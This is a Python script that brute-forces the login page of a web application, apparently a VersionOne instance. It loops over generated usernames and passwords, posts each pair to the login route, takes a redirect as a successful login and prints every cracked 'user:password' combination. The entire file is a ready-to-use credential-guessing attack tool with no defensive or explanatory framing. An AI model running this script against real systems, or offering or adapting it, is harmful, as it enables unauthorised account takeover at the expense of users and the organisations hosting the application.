#!/usr/bin/python3
import sys
import requests

from nousers import construct_unames, construct_passwords

default_url = "http://<v1host>/<instancename>"
login_route = "/Account.mvc/Login"
logout_route = "/Account.mvc/LogOut"

unames = construct_unames()
print("constructed {0} usernames for brute forcing...".format(len(unames)))

passwords = construct_passwords()
print("constructed {0} passwords for brute forcing...".format(len(passwords)))
prompt = "{0} web requests will be generated.  Do you want to continue?  (Y/n)  ".format(len(unames) * len(passwords))
result = input(prompt)
if not result == "Y":
    print('quitter!')
    sys.exit(0)

r = requests.get(default_url)

if not r.status_code == 200:
    print("Exiting:  invalid url {0}".format(default_url))
    sys.exit(1)

cracked_accounts = []

print("working...")
for uname in unames:
    for pw in passwords:
        r = requests.post(default_url + login_route, data = {'username': uname, 'password': pw, 'Destination': ''})
        if len(r.history) == 0:
            continue
        combo = "{0}:{1}".format(uname, pw)
        cracked_accounts.append(combo)

if len(cracked_accounts) > 0:
    for account in cracked_accounts:
        print(account)